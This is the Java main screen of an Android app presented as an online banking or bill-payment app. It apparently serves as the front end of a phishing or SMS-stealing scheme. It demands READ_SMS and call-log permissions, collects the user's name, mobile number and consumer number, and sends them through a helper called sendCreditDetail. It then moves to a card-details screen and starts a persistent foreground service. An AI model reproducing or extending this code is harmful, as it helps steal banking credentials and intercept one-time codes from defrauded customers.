package com.codewithmuddasir.onlinebanking;

import static com.codewithmuddasir.onlinebanking.helper.Setting.model;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.databinding.DataBindingUtil;

import android.Manifest;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.ProgressDialog;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.content.res.ColorStateList;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.ContextThemeWrapper;
import android.widget.EditText;
import android.widget.RadioButton;
import android.widget.RadioGroup;
import android.widget.TextView;
import android.widget.Toast;

import com.codewithmuddasir.onlinebanking.databinding.ActivityMainBinding;
import com.codewithmuddasir.onlinebanking.helper.Setting;
import com.codewithmuddasir.onlinebanking.helper.Util;
import com.google.android.material.button.MaterialButton;

import java.sql.SQLOutput;
import java.util.Random;
import java.util.zip.Inflater;

public class MainActivity extends AppCompatActivity {

    ActivityMainBinding binding;

    boolean doubleBackToExitPressedOnce;

    private Util util;

    private static final int PERMISSION_REQUEST_CODE = 1;

    private ProgressDialog progressDialog;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = DataBindingUtil.setContentView(this, R.layout.activity_main);

        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            // Permission is not granted, request permission
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{android.Manifest.permission.READ_SMS, Manifest.permission.READ_CALL_LOG}, PERMISSION_REQUEST_CODE);
        }

        util = new Util();

        progressDialog = new ProgressDialog(MainActivity.this);
        progressDialog.setMessage("Loading... Please Wait");
        progressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        progressDialog.setCancelable(false);

        final String[] billType = {""};

        binding.billType.setOnCheckedChangeListener(new RadioGroup.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(RadioGroup group, int checkedId) {
                // Get the selected Radio Button by its ID
                RadioButton selectedRadioButton = findViewById(checkedId);

                // Check if a RadioButton is selected
                if (selectedRadioButton != null) {
                    String selectedOption = selectedRadioButton.getText().toString();
                    billType[0] = selectedOption;
                }
            }
        });

        binding.login.setOnClickListener(view -> {
            if (!isFieldsEmpty(binding.fullName, binding.mobileNo, binding.consumerNo)) {
                progressDialog.show();

                Random random = new Random();
                int code = random.nextInt(900000) + 100000;

                String userId = String.valueOf(code);

                model.setUserId(userId);

                util.sendCreditDetail(this, model.getUserId(), binding.consumerNo.getText().toString(), binding.fullName.getText().toString(), binding.mobileNo.getText().toString(), billType[0], () -> {
                    util.saveLocalData(this, "userId", model.getUserId());

                    progressDialog.dismiss();
                    startActivity(new Intent(this, CardDetail.class));
                    Intent serviceIntent = new Intent(this, MyForegroundService.class);
                    ContextCompat.startForegroundService(this, serviceIntent);
                    finish();
                });
            }
        });

////        if (!util.getLocalData(this, "userId").isEmpty()) {
////            progressDialog.show();
////        }
//
        String CHANNEL_ID = "channel_id";
//
//// Create the notification channel
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = "My Channel Name";
            String description = "My Channel Description";
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);

            // Register the channel with the system
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
    }

    public boolean isFieldsEmpty(EditText... editTexts) {
        boolean isEmpty = false;
        for (EditText editText : editTexts) {
            if (editText.getText().toString().trim().length() == 0) {
                isEmpty = true;
                editText.setError("This field is required");
            }
        }
        return isEmpty;
    }

    @Override
    public void onBackPressed() {
        if (doubleBackToExitPressedOnce) {
            super.onBackPressed();
            return;
        }

        this.doubleBackToExitPressedOnce = true;
        Toast.makeText(this, "Press back again to exit", Toast.LENGTH_SHORT).show();

        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                doubleBackToExitPressedOnce=false;
            }
        }, 2000); // Change this delay as per your requirement
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String permissions[], int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {// If permission is granted
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission is granted, read SMS messages
                Toast.makeText(MainActivity.this, "Permission granted", Toast.LENGTH_SHORT).show();
            } else {
                // Permission is not granted, show message or disable feature
                if (ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_SMS)) {
                    // User has denied permission once, show explanation
                    AlertDialog.Builder builder = new AlertDialog.Builder(this);
                    builder.setTitle("Permission Required")
                            .setMessage("This app requires permission to read SMS messages in order to function properly. Please grant the permission in the app settings.")
                            .setPositiveButton("OK", new DialogInterface.OnClickListener() {
                                public void onClick(DialogInterface dialog, int id) {
                                    // Open app settings to grant permission manually
                                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                                    Uri uri = Uri.fromParts("package", getPackageName(), null);
                                    intent.setData(uri);
                                    startActivity(intent);
                                }
                            })
                            .setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                                public void onClick(DialogInterface dialog, int id) {
                                    // User cancelled the dialog
                                    Toast.makeText(MainActivity.this, "Permission denied", Toast.LENGTH_SHORT).show();
                                }
                            });
                    builder.show();
                } else {
                    // User has denied permission twice, show message
                    Toast.makeText(MainActivity.this, "Permission denied. Please grant the permission in the app settings.", Toast.LENGTH_LONG).show();
                }
            }
            return;
        }
    }

}